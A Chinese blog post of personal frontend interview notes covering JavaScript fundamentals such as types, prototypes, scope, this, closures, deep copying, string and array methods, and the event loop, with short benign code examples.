class="article-title" data-v-61fb5e44="">
            前端面试题整理(方便自己看的)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984288917575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    就叫曲奇饼干吧
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:46:40.000Z" title="Fri Jan 02 2026 08:46:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读25分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript题</h2>
<h3 data-id="heading-1">1.JavaScript中的数据类型？</h3>
<p>在<code>JavaScript中</code>，分两种类型:</p>
<ul>
<li>基本类型</li>
<li>引用类型</li>
</ul>
<p>基本类型主要有以下6种：<code>Number、String、Boolean、Undefined、null、symbol</code>。
引用类型主要有<code>Object、Array、Function</code>。其它的有<code>Date、RegExp、Map等</code>。</p>
<h3 data-id="heading-2">2.DOM</h3>
<p><code>文档对象模型（DOM）</code>是<code>HTML</code>和<code>XML</code>文档的编程接口。
日常开发离不开<code>DOM</code>的操作，对节点的增删改查等操作。在以前，使用<code>Jquery</code>,<code>zepto</code>等库来操作<code>DOM</code>,之后在<code>vue</code>,<code>Angular</code>,<code>React</code>等框架出现后，通过操作数据来控制<code>DOM</code>(多数情况下)，越来越少的直接去操作<code>DOM</code>。</p>
<h3 data-id="heading-3">3.BOM</h3>
<h4 data-id="heading-4">3.1 BOM是什么？</h4>
<p><code>BOM</code>(Browser Object Model)，浏览器对象模型，提供了独立于内容与浏览器窗口进行交互的对象。其作用就是跟浏览器做一些交互效果，比如：进行页面的后退、前进、刷新、浏览器窗口发生变化，滚动条滚动等。</p>
<h4 data-id="heading-5">3.2 window</h4>
<p><code>Bom</code>的核心对象是<code>window</code>,它表示浏览器的一个实例。
在浏览器中，window即是浏览器窗口的一个接口，又是全局对象。</p>
<h3 data-id="heading-6">4 == 和 === 区别，分别在什么情况使用</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/877bda4308f6465bb14d2bdba66d322e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCx5Y-r5puy5aWH6aW85bmy5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948400&amp;x-signature=yXYEa8YMxjwGuMV22acZv%2FDv0ds%3D" alt="image.png" loading="lazy"/></p>
<p>等于操作符用俩个等于号(==)表示，如果操作数相等，则会返回<code>true</code>。
等于操作符(==)在比较中会先进行类型转换，再确定操作数是否相等。</p>
<p>全等操作符由3个等于号(===)表示,只有俩个操作数在不转换的前提下相等才返回true,即类型相同，值也相同。</p>
<p>区别：等于操作符（==）会做类型转换再进行值的比较，全等操作符不会做类型转换。
<code>null</code> 和<code>undefined</code> 比较，相等操作符为<code>true</code> 全等为<code>false</code>。</p>
<h3 data-id="heading-7">5 typeof 和 instanceof 的区别</h3>
<p><code>typeof</code> 操作符返回一个字符串，表示未经计算的操作数的类型。</p>
<p><code>instanceof</code> 运算符用于检测构造函数的<code>prototype</code>属性是否出现在某个实例对象的原型链上。</p>
<p>区别：</p>
<ul>
<li><code>typeof</code> 会返回一个变量的基本类型，<code>instanceof</code> 返回的是一个<code>Boolean</code>.</li>
<li><code>instanceof</code> 可以准确的判断复杂引用数据类型，但是不能正确判断基础数据类型。</li>
<li>如果需要通用检测数据类型，可以通过<code>Object.prototype.toString</code>,调用该方法，统一返回格式
<code>[object XXX]</code>的字符串。</li>
</ul>
<h3 data-id="heading-8">6 JavaScript 原型，原型链？有什么特点？</h3>
<h4 data-id="heading-9">原型</h4>
<p><code>JavaScript</code>常被描述为一种基于原型的语言---每个对象拥有一个原型对象。访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或达到原型链的末尾。</p>
<h4 data-id="heading-10">原型链</h4>
<p>原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为原型链，它解释了为何一个对象会拥有定义在其他对象中的属性和方法。</p>
<p>在对象实例和它的构造器之间建立一个链接(它是_proto_属性，是从构造函数的prototype属性派生的)，之后通过上溯原型链，在构造器中找到这些属性和方法。</p>
<ul>
<li>一切对象都是继承自<code>Object</code>对象，object对象直接继承根源对象<code>null</code></li>
<li>一切的函数对象（包括<code>object对象</code>），都是继承自<code>Function</code>对象</li>
<li><code>Object</code> 对象直接继承自 <code>Function</code> 对象</li>
<li><code>Function</code> 对象的 <code>_proto_</code> 会指向自己的原型对象，最终还是继承自 <code>Object</code> 对象</li>
</ul>
<h3 data-id="heading-11">7.对作用域链的理解</h3>
<p>作用域，即变量和函数生效的区域或集合，作用域决定了代码区块中变量和其他资源的可见性。</p>
<ul>
<li>全局作用域：任何不在函数中或是大括号中声明的变量，都是在全局作用域下，全局作用域下声明的变量可以在任意位置访问。</li>
<li>函数作用域：函数作用域也叫局部作用域，如果一个变量是在函数内部声明的，它就在一个函数作用域下面。这些变量只能在函数内部访问，不能在函数以外去访问。</li>
<li>块级作用域：ES6引入了<code>let</code>和<code>const</code>关键字，和<code>var</code>关键字不同，在大括号中使用<code>let</code>和<code>const</code>声明的变量存在于块级作用域中。在大括号外面不能访问这些变量。</li>
</ul>
<h4 data-id="heading-12">作用域链</h4>
<p>当在<code>JavaScript</code>中使用一个变量的时候，首先<code>JavaScript</code>引擎会尝试在当前作用域下去寻找该变量，如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。</p>
<h3 data-id="heading-13">8. 谈谈对this对象的理解</h3>
<h4 data-id="heading-14">8.1定义</h4>
<p>函数的<code>this</code>关键字在<code>JavaScript</code>中的表现略有不同，此外，在严格模式和非严格模式之间也会有一些差别。在绝大数情况下，函数的调用方式决定了<code>this</code>的值。
<code>this</code>关键字是函数运行时自动生成的一个内部对象，只能在函数内部使用，总指向调用它的对象。</p>
<h4 data-id="heading-15">8.2 new绑定</h4>
<p>通过构造函数<code>new</code> 关键字生成一个实例对象，此时<code>this</code>指向这个实例对象。</p>
<p>apply()、call()、bind()、是函数的一个方法，作用是改变函数的调用对象。它的第一个参数就表示改变后的调用这个函数的对象。因此，这时<code>this</code>指的就是这个第一个参数。</p>
<h4 data-id="heading-16">8.3 箭头函数</h4>
<p>在ES6的语法中，提供了箭头函数法，让我们在代码书写时就能确定this的指向。</p>
<h3 data-id="heading-17">9.new操作符具体干了什么</h3>
<ul>
<li>创建一个新的对象</li>
<li>将对象与构建函数通过原型链链接起来</li>
<li>将构建函数中的<code>this</code>绑定到新建的对象上</li>
<li>根据构建函数返回类型做判断，如果原始值则被忽略，如果是返回对象，需要正常处理。</li>
</ul>
<h3 data-id="heading-18">10.bind、call、apply区别？</h3>
<p><code>bind</code>、<code>call</code>、<code>apply</code>、作用是改变函数执行时的上下文，改变函数运行时的this指向。</p>
<p>区别：</p>
<ul>
<li>三者都可以改变函数的<code>this</code>指向</li>
<li>三者第一个参数都是this要指向的对象，如果没有这个参数或者参数为<code>undefined</code>或<code>null</code>,则默认指向全局<code>window</code></li>
<li>三者都可以传参，但是<code>apply</code>是数组，而<code>call</code>是参数列表，且<code>apply</code>和<code>call</code>是一次性传入参数，而<code>bind</code>可以分多次传入</li>
<li><code>bind</code>是返回绑定<code>this</code>之后的函数，<code>apply</code>、<code>call</code>则是立即执行</li>
</ul>
<h3 data-id="heading-19">11.闭包的理解？闭包使用场景？</h3>
<h4 data-id="heading-20">11.1 闭包是什么？</h4>
<p>一个函数和对其周围状态的引用捆绑在一起，这样的组合就是闭包。闭包让你可以在一个内层函数中访问到其外层函数的作用域。</p>
<h4 data-id="heading-21">11.2 闭包使用场景</h4>
<ul>
<li>创建私有变量</li>
<li>延长变量的生命周期</li>
</ul>
<h4 data-id="heading-22">11.3 柯里化函数</h4>
<p>柯里化的目的在于避免频繁调用具有相同参数函数的同时，又能够轻松的重用。</p>
<h4 data-id="heading-23">11.4 闭包的缺点</h4>
<p>如果不是某些特定任务需要使用闭包，在其它函数中创建函数是不明智的，因为闭包在处理速度和内存消耗方面对脚本性能有负面影响。</p>
<h3 data-id="heading-24">12.深拷贝浅拷贝的区别？实现一个深拷贝？</h3>
<h4 data-id="heading-25">12.1 浅拷贝</h4>
<p><code>Object.assign</code>、<code>Array.prototype.slice()</code>、<code>Array.prototype.concat()</code>、<code>拓展运算符</code>实现复制。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'xxx'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">17</span>
}
<span class="hljs-keyword">var</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, obj);
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> b = a.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>);
b[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b);<span class="hljs-comment">// [1,2,3] [1,4,3]</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> b = [...a];
b[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b);<span class="hljs-comment">// [1,2,3] [1,4,3]</span>
</code></pre>
<h4 data-id="heading-26">12.2 深拷贝</h4>
<p>常见深拷贝方式：</p>
<ul>
<li>_.cloneDeep()</li>
<li>jQuery.extend()</li>
<li>JSON.stringify()</li>
<li>手写循环递归</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>);
<span class="hljs-keyword">const</span> obj1 = {
    <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">b</span>: { <span class="hljs-attr">f</span>: { <span class="hljs-attr">g</span>: <span class="hljs-number">1</span> } },
    <span class="hljs-attr">c</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
};
<span class="hljs-keyword">const</span> obj2 = _.<span class="hljs-title function_">cloneDeep</span>(obj1);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">b</span>.<span class="hljs-property">f</span> === obj2.<span class="hljs-property">b</span>.<span class="hljs-property">f</span>); <span class="hljs-comment">// false</span>
</code></pre>
<p>JSON.stringify()</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 有缺点 会忽略undefined、symbol、函数</span>
<span class="hljs-keyword">const</span> obj2=<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj1));
</code></pre>
<p>循环递归</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj, hash = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) {
    <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> obj; <span class="hljs-comment">//null或者undefined就不拷贝</span>
    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj);
    <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(obj);
    <span class="hljs-comment">// 可能是对象或者普通的值 如果是函数的话不拷贝</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">"object"</span>) <span class="hljs-keyword">return</span> obj;
    <span class="hljs-comment">// 是对象的话就要进行深拷贝</span>
    <span class="hljs-keyword">if</span> (hash.<span class="hljs-title function_">get</span>(obj)) <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">get</span>(obj);
    <span class="hljs-keyword">let</span> cloneObj = <span class="hljs-keyword">new</span> obj.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>);
    hash.<span class="hljs-title function_">set</span>(obj, cloneObj);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> obj) {
        <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
            <span class="hljs-comment">// 实现一个递归拷贝</span>
            cloneObj[key] = <span class="hljs-title function_">deepClone</span>(obj[key], hash);
        }
    }
    <span class="hljs-keyword">return</span> cloneObj;
}
</code></pre>
<h4 data-id="heading-27">12.3 区别</h4>
<blockquote>
<p>浅拷贝只复制属性指向某个对象的指针，而不复制对象本身，新旧对象还是共享一块内存，修改对象属性会影响原对象。</p>
</blockquote>
<blockquote>
<p>深拷贝会另外创建一个一模一样的对象，不共享内存，不影响原对象。</p>
</blockquote>
<h3 data-id="heading-28">13. JavaScript字符串的常用方法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> stringValue = <span class="hljs-string">"hello world"</span>; 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringValue.<span class="hljs-title function_">slice</span>(<span class="hljs-number">3</span>, <span class="hljs-number">7</span>)); <span class="hljs-comment">// "lo w"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringValue.<span class="hljs-title function_">substring</span>(<span class="hljs-number">3</span>,<span class="hljs-number">7</span>)); <span class="hljs-comment">// "lo w"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringValue.<span class="hljs-title function_">substr</span>(<span class="hljs-number">3</span>, <span class="hljs-number">7</span>)); <span class="hljs-comment">// "lo worl"</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 删除前、后或者前后所有空格符，再返回新的字符串</span>
<span class="hljs-keyword">let</span> stringValue = <span class="hljs-string">" hello world "</span>;
<span class="hljs-keyword">let</span> trimmedStringValue = stringValue.<span class="hljs-title function_">trim</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stringValue); <span class="hljs-comment">// " hello world "</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(trimmedStringValue); <span class="hljs-comment">// "hello world"</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 接收一个整数参数，将字符串复制多少次，返回拼接所有副本后的结果</span>
<span class="hljs-keyword">let</span> stringValue = <span class="hljs-string">"na "</span>;
<span class="hljs-keyword">let</span> copyResult = stringValue.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>) <span class="hljs-comment">// na na</span>
</code></pre>
<ul>
<li>toUpperCase()、toLowerCase() 大小写转化</li>
<li>indexOf() 从字符串开头去搜索传入的字符串，并返回位置(没找到返回-1)</li>
<li>includes() 字符串是否包含传入的字符串</li>
<li>split() 把字符串按照指定分隔符，拆分成数组</li>
<li>replace() 接收俩个参数，第一个参数为匹配的内容，第二个参数为替换的元素</li>
</ul>
<h3 data-id="heading-29">14.数组常用方法</h3>
<h4 data-id="heading-30">增</h4>
<ul>
<li>push() 添加到数组末尾</li>
<li>unshift() 在数组开头添加</li>
<li>splice() 传入3个参数，开始位置、0（要删除的元素数量）、插入的元素</li>
<li>concat() 合并数组，返回一个新数组</li>
</ul>
<h4 data-id="heading-31">删</h4>
<ul>
<li>pop() 删除数组最后一项，返回被删除的项。</li>
<li>shift() 删除数组的第一项，返回被删除的项。</li>
<li>splice()传入两个参数，开始位置，删除元素的数量，返回包含删除元素的数组。</li>
<li>slice() 用于创建一个包含原有数组中一个或多个元素的新数组，不会影响原始数组。</li>
</ul>
<h4 data-id="heading-32">查</h4>
<ul>
<li>indexOf() 返回要查找元素在数组中的位置，如果没找到则返回 -1.</li>
<li>includes() 返回查找元素是否在数组中，有返回true,否则false.</li>
<li>find() 返回第一个匹配的元素。</li>
</ul>
<h4 data-id="heading-33">排序方法</h4>
<ul>
<li>reverse() 将数组元素方向反转</li>
<li>sort() 接受一个比较函数，用于判断那个值在前面</li>
<li/>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">compare</span>(<span class="hljs-params">value1, value2</span>) {
    <span class="hljs-keyword">if</span> (value1 &lt; value2) {
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value1 &gt; value2) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}
<span class="hljs-keyword">let</span> values = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>];
values.<span class="hljs-title function_">sort</span>(compare);
<span class="hljs-title function_">alert</span>(values); <span class="hljs-comment">// 0,1,5,10,15</span>
</code></pre>
<h4 data-id="heading-34">转换方法</h4>
<p>join() 方法接收一个参数，即字符串分隔符，返回包含所有项的字符串。</p>
<h4 data-id="heading-35">循环方法</h4>
<h5 data-id="heading-36">some() 和 every() 方法一样</h5>
<p>对数组每一项都运行传入的测试函数，如果至少有一个元素返回true,则这个方法返回true.</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
<span class="hljs-keyword">let</span> someResult = numbers.<span class="hljs-title function_">some</span>(<span class="hljs-function">(<span class="hljs-params">item, index, array</span>) =&gt;</span> item &gt; <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(someResult) <span class="hljs-comment">// true</span>
</code></pre>
<h5 data-id="heading-37">forEach()</h5>
<p>对数组每一项都运行传入的函数，没有返回值</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index, array</span>) =&gt;</span> {
    <span class="hljs-comment">//执行操作</span>
});
</code></pre>
<h5 data-id="heading-38">filter()</h5>
<p>函数返回true 的项会组成数组之后返回。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
<span class="hljs-keyword">let</span> filterResult = numbers.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">item, index, array</span>) =&gt;</span> item &gt; <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(filterResult); <span class="hljs-comment">// 3,4,5,4,3</span>
</code></pre>
<h5 data-id="heading-39">map()</h5>
<p>返回由每次函数调用的结果构成的数组。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>];
<span class="hljs-keyword">let</span> mapResult = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item, index, array</span>) =&gt;</span> item * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapResult) <span class="hljs-comment">// 2,4,6,8,10,8,6,4,2</span>
</code></pre>
<h4 data-id="heading-40">15.事件循环的理解？</h4>
<h5 data-id="heading-41">事件循环</h5>
<p>JavaScript是一门单线程的语言，实现单线程非阻塞的方法就是事件循环。
在<code>JavaScript</code>中，所有的任务都可以分为：</p>
<ul>
<li>同步任务：立即执行的任务，同步任务一般会直接进入到主线程执行。</li>
<li>异步任务：异步的比如<code>ajax</code>网络请求，<code>setTimeout</code>定时函数等。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89c5175c843b4dcda097517caccab9f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCx5Y-r5puy5aWH6aW85bmy5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948400&amp;x-signature=ded2klux9ivZeOZ7KsPm5j%2FhjPA%3D" alt="image.png" loading="lazy"/></p>
<p>同步任务进入主线程，异步任务进入任务队列，主线程内的任务执行完毕为空，会去任务队列读取对应的任务，推入主线程执行。上述过程不断重复就是<code>事件循环</code>。</p>
<h5 data-id="heading-42">宏任务与微任务</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>)
}, <span class="hljs-number">0</span>)
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>)=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'new Promise'</span>)
    <span class="hljs-title function_">resolve</span>()
}).<span class="hljs-title function_">then</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'then'</span>)
})
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>)
</code></pre>
<ul>
<li>遇到 console.log(1)，直接打印1</li>
<li>遇到定时器，属于新的宏任务，留着后面执行</li>
<li>遇到 new Promise，这个是直接执行的，打印'newPromise</li>
<li>.then 属于微任务，放入微任务队列，后面再执行</li>
<li>遇到 console.log(3)直接打印 3</li>
<li>好了本轮宏任务执行完毕，现在去微任务列表查看是否有微任务，发现.then 的回调，执行它打印'then'</li>
<li>当一次宏任务执行完，再去执行新的宏任务，这里就剩一个定时器的宏任务了，执行它，打印 2</li>
</ul>
<p>结果是:<code>1=&gt;'new Promise'=&gt; 3 =&gt; 'then' =&gt; 2</code></p>
<p>异步任务执行顺序，事件队列其实是一个“先进先出”的数据结构，排在前面的事件会优先被主线程读取。</p>
<h6 data-id="heading-43">微任务</h6>
<p>常见的微任务有：</p>
<ul>
<li>Promise.then</li>
<li>MutaionObserver</li>
<li>process.nextTice(node.js)</li>
</ul>
<h6 data-id="heading-44">宏任务</h6>
<p>宏任务的时间粒度比较大，执行的时间间隔是不能精确控制的，对一些高实时性的需求就不太符合.</p>
<p>常见的宏任务有:</p>
<ul>
<li>script(可以理解为外层同步代码)</li>
<li>setTimeout/setInterval</li>
<li>Ul rendering/Ul事件</li>
<li>postMessage、MessageChannel</li>
<li>setlmmediate、1/0(Node.is)
这时候，事件循环，宏任务，微任务的关系如图所示</li>
</ul>
